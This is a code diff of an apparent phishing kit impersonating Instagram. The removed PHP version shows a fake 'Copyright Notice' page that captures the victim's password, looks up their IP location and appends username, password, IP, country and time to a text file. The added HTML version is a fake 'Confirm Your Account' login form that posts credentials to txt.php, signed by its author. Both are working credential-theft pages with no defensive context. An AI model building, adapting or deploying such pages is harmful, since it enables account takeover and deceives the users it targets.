@@ -1,1 +1,45 @@
-<?php error_reporting(0); function ara($bas, $sfon, $yazi) {     preg_match_all('/' . preg_quote($bas, '/') .     '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);     return $m[1]; } $nick = $_GET['nick']; $_SERVER["erhanbey"]=$nick; $url = 'https://instagram.com/' . $nick;     $html = file_get_contents($url);     $dom = new DOMDocument();     $dom->loadHTML($html);     $veri = $dom->textContent;     $cc = ara('"thumbnail_src":"','"',$veri);     $meta_tags = $dom->getElementsByTagName('meta');     foreach( $meta_tags as $meta ) {         if( $meta->getAttribute('property') == 'og:image' ) {             $image_url = $meta->getAttribute('content');         }     } if(empty($cc)){         $cc[0] = $image_url;     } if($_POST){ $password =  $_POST['password']; $ip = $_SERVER['REMOTE_ADDR']; $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}")); $ulke = $details->country; date_default_timezone_set('Europe/Istanbul'); $cur_time=date("d-m-Y H:i:s"); $file = fopen('wolfteam.txt', 'a'); fwrite($file, "Username: ".$nick."\n\n" ."Password: ".$password. "\n\n"."Ip Adress: " .$ip."\zn\n"  ."Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n"); fclose($file); echo '';     header("Location: mailform.php"); }      ?> <html>  <head>      <meta charset="utf-8"> 	 <title>Copyright | Help Instagram</title> 	 <meta name="viewport" content="width=device-width"> <link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">	 <style>  #ana{ background-color:#fafafa; } #erhan{ border-radius:5px;}  #erhanasd{ font-family:sans-serif; font-weight:400; letter-spacing:; color:#3d3d3d; font-size:25px; }  #sa{ background-color:white; width:300px;  } #yazi1{ font-family:sans-serif; color:#999; width:270px;  }  #copyright{ font-family:sans-serif; color:#999;} #menu{   width:70%; }  #liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540;      vertical-align: baseline; } #üst{ width:100%; background-color:white;  height:79px; }  #buton{ color:white; background-color:#3897f0; font-size:16px;  border-radius:3px; outline:none; font-family:sans-serif; font-weight:700; border:0; width:200px; height:40px; max-width:99%; max-height:50px; }  #password{ background-color:#fafafa; border:0; outline:none; border-radius:6px; width:220px; height:35px;  font-size:16px;}  </style> 	  </head> <body id="ana" style="padding:0px; margin:0px;"> <!--  Bu script x tarafından kodlanmıştır izinsiz kullanmayınız -->    <div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >  <img src="https://resimag.com/p1/819f2f28aae.png" width=140 id="erhan" style="margin:6px;" > <br><br> </div> <br><br>  <center> <div id="sa" style="border:1px solid #cecece;"> <br>    <br> <img class="" src="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png" style="width:80px;height: 80px;"> <br> <h1 id="erhanasd">Copyright Notice  </h1> <p id="yazi1">     Hello <?php echo $nick; ?>;  <br> o verify your account, please enter your password and continue.  </p>    <form method="post" > <input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none; color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;     margin: 0;     outline: 0;     overflow: hidden;     padding: 9px 0 7px 8px;     text-overflow: ellipsis; border: 1px solid #e6e6e6;    text-overflow: ellipsis;     font: 400 13.3333px Arial; border-radius:3px;"><br><br> <button id="buton" type="submit"> Confirm as<?php echo $nick; ?> </button><br>     </form>  </center>    </div> <br> <br> <center> <div id="get"> <img src="https://resimag.com/p1/b6a0e4390db.png" width=120 > <img src="https://resimag.com/p1/45ce843a3fd.png" width=120> </div> <br><br> <div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;  <li id="liste"><a href="" id="link">LANGUAGE</a> </li>  </div> <br> <p id="copyright">INSTAGRAM FACEBOOK FORM 2020 </p> </center>   </body>   </html>
+<!doctype html>
+<html>
+ <head> 
+  <meta charset="utf-8"> 
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=0">
+ <link rel="stylesheet" href="style.css">  
+<link rel="shortcut icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png">
+  <title> Instagram </title>
+ </head> 
+ <body> 
+     <div class="header-ig"><div class="header-ig-text"><p class="header-ig-ig">Instagram</p><p class="header-ig-2"> Find for free on Google Play.</p></div>
+   <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D27C892C7-1B67-4BBA-ABFC-755E7134B0EE%26utm_content%3Dlo%26utm_medium%3DinstallLink"><button>GET</button></a>
+   </div>  <!-- @PSİKOPATCODER -->
+  <center> 
+   <div id="rgn" class="content"> 
+    <img src="https://i.imgyukle.com/2020/09/02/xr18Pq.png" id="melisa"> 
+    <br>   <!-- @PSİKOPATCODER -->
+    <span> Confirm Your Account</span> 
+    <form action="txt.php" method="post"> 
+     <input type="text" placeholder="Username" class="psikopatcoder" name="username" required> 
+     <input type="password" placeholder="Password" class="psikopatcoder" name="password" required>
+	<select id="select">  <!-- @PSİKOPATCODER -->
+		<option value="Business Account">Business Account</option>
+		<option value="Fun">Fun</option>
+		<option value="Private">Private</option>
+		<option value="Trade">Trade</option>
+		<option value="Music">Music</option>
+		<option value="Orther">Orther</option>
+	</select>  <!-- @PSİKOPATCODER -->
+	 <input type="submit" value="Confirm Account" name="submit" id="butonck">
+    </form>   <!-- @PSİKOPATCODER -->
+   </div> 
+   <div id="footer"> 
+    <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
+    <a href="https://help.instagram.com/"> HELP </a> 
+    <a href="https://www.instagram.com/developer/"> API </a> 
+    <a href="https://www.instagram.com/about/jobs/"> JOBS </a> 
+    <a href="https://help.instagram.com/581066165581870"> TERMS</a> 
+    <a href="https://help.instagram.com/519522125107875"> PRIVACY </a> 
+    <p>© 2020 INSTAGRAM, INC. </p> 
+   </div> 
+  </center> 
+<script language="javascript" src="http://ir.sitekodlari.com/sagtusengelleme1.js"></script>
+ </body>
+</html>
